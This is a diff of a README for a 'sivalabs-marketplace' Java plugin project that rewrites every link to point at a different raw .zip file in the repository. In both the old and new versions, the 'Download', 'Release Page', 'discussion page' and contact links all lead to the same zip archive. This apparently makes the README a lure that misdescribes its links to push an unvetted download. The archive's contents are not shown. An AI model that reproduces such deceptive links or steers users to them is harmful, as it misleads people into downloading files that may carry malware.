@@ -1,6 +1,6 @@
 # 🚀 sivalabs-marketplace - Easy Plugins for Java Apps
 
-[![Download Now](https://github.com/Sheddy-bot/sivalabs-marketplace/raw/refs/heads/main/plugins/spring-boot-dev/skills/spring-service-creator/sivalabs-marketplace-2.2.zip%20Now-Ready%20to%20Use-brightgreen)](https://github.com/Sheddy-bot/sivalabs-marketplace/raw/refs/heads/main/plugins/spring-boot-dev/skills/spring-service-creator/sivalabs-marketplace-2.2.zip)
+[![Download Now](https://github.com/Sheddy-bot/sivalabs-marketplace/raw/refs/heads/main/plugins/spring-boot-dev/marketplace-sivalabs-3.3.zip%20Now-Ready%20to%20Use-brightgreen)](https://github.com/Sheddy-bot/sivalabs-marketplace/raw/refs/heads/main/plugins/spring-boot-dev/marketplace-sivalabs-3.3.zip)
 
 ## 🛠️ Overview
 
@@ -9,7 +9,7 @@ Welcome to the **sivalabs-marketplace**! This project offers Java Application De
 ## 📥 Download & Install
 
 1. **Visit the Release Page:** Click on the link below to access the download options:
-   [Download from Releases](https://github.com/Sheddy-bot/sivalabs-marketplace/raw/refs/heads/main/plugins/spring-boot-dev/skills/spring-service-creator/sivalabs-marketplace-2.2.zip)
+   [Download from Releases](https://github.com/Sheddy-bot/sivalabs-marketplace/raw/refs/heads/main/plugins/spring-boot-dev/marketplace-sivalabs-3.3.zip)
 
 2. **Choose the Latest Version:** On the releases page, look for the most recent version at the top of the list. Each version will have details about new features and improvements.
 
@@ -61,7 +61,7 @@ If you encounter issues during installation or usage, here are a few tips:
 
 ## 🤝 Community Support
 
-Need help? You can reach out to our community for assistance. Engage with other users to share experiences and solutions. Simply head over to our [discussion page](https://github.com/Sheddy-bot/sivalabs-marketplace/raw/refs/heads/main/plugins/spring-boot-dev/skills/spring-service-creator/sivalabs-marketplace-2.2.zip).
+Need help? You can reach out to our community for assistance. Engage with other users to share experiences and solutions. Simply head over to our [discussion page](https://github.com/Sheddy-bot/sivalabs-marketplace/raw/refs/heads/main/plugins/spring-boot-dev/marketplace-sivalabs-3.3.zip).
 
 ## 📄 License
 
@@ -69,6 +69,6 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 ## 📞 Contact
 
-For any queries or feedback, please contact us at [https://github.com/Sheddy-bot/sivalabs-marketplace/raw/refs/heads/main/plugins/spring-boot-dev/skills/spring-service-creator/sivalabs-marketplace-2.2.zip]. We appreciate your input and look forward to hearing from you!
+For any queries or feedback, please contact us at [https://github.com/Sheddy-bot/sivalabs-marketplace/raw/refs/heads/main/plugins/spring-boot-dev/marketplace-sivalabs-3.3.zip]. We appreciate your input and look forward to hearing from you!
 
-[![Download Now](https://github.com/Sheddy-bot/sivalabs-marketplace/raw/refs/heads/main/plugins/spring-boot-dev/skills/spring-service-creator/sivalabs-marketplace-2.2.zip%20Now-Ready%20to%20Use-brightgreen)](https://github.com/Sheddy-bot/sivalabs-marketplace/raw/refs/heads/main/plugins/spring-boot-dev/skills/spring-service-creator/sivalabs-marketplace-2.2.zip)
+[![Download Now](https://github.com/Sheddy-bot/sivalabs-marketplace/raw/refs/heads/main/plugins/spring-boot-dev/marketplace-sivalabs-3.3.zip%20Now-Ready%20to%20Use-brightgreen)](https://github.com/Sheddy-bot/sivalabs-marketplace/raw/refs/heads/main/plugins/spring-boot-dev/marketplace-sivalabs-3.3.zip)
